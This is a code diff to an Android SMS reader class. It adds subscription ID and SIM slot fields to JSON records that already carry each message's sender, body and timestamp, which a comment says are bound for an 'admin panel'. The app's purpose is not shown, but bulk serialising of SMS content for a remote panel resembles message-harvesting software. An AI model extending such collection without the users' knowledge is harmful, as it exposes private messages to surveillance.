@@ -47,7 +47,9 @@ class SmsReader(private val context: Context) {
                 Telephony.Sms._ID,
                 Telephony.Sms.ADDRESS,
                 Telephony.Sms.BODY,
-                Telephony.Sms.DATE
+                Telephony.Sms.DATE,
+                Telephony.Sms.SUBSCRIPTION_ID,
+                Telephony.Sms.SIM_SLOT
             ),
             null,
             null,
@@ -59,6 +61,18 @@ class SmsReader(private val context: Context) {
             val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
             val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
             val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
+            val subIdIndex = it.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID)
+            // SIM_SLOT constant is API 35+; fall back to raw column name on older devices
+            var slotIndex = it.getColumnIndex("sim_slot")
+            if (slotIndex < 0) {
+                slotIndex = try {
+                    it.getColumnIndex(Telephony.Sms.SIM_SLOT)
+                } catch (e: NoSuchFieldError) {
+                    -1
+                } catch (e: Exception) {
+                    -1
+                }
+            }
             var count = 0
 
             while (it.moveToNext() && count < limit) {
@@ -67,6 +81,12 @@ class SmsReader(private val context: Context) {
                 val address = it.getString(addressIndex) ?: "Unknown"
                 val body = it.getString(bodyIndex) ?: ""
                 val date = it.getLong(dateIndex)
+                val subId = if (subIdIndex >= 0) {
+                    try { it.getInt(subIdIndex) } catch (e: Exception) { -1 }
+                } else -1
+                val slot = if (slotIndex >= 0) {
+                    try { it.getInt(slotIndex) } catch (e: Exception) { -1 }
+                } else -1
 
                 val smsJson = JSONObject().apply {
                     put("id", "${type}_$id")
@@ -75,6 +95,13 @@ class SmsReader(private val context: Context) {
                     put("message", body)
                     put("timestamp", formatDate(date))
                     put("type", type)
+                    // Per-SIM provenance for multi-SIM detection in the admin panel.
+                    // -1 / missing = unknown (older Android versions omit these columns).
+                    if (subId > 0) put("subscriptionId", subId)
+                    if (slot >= 0) {
+                        put("slotIndex", slot)
+                        put("simSlot", slot)
+                    }
                 }
                 smsArray.put(smsJson)
             }
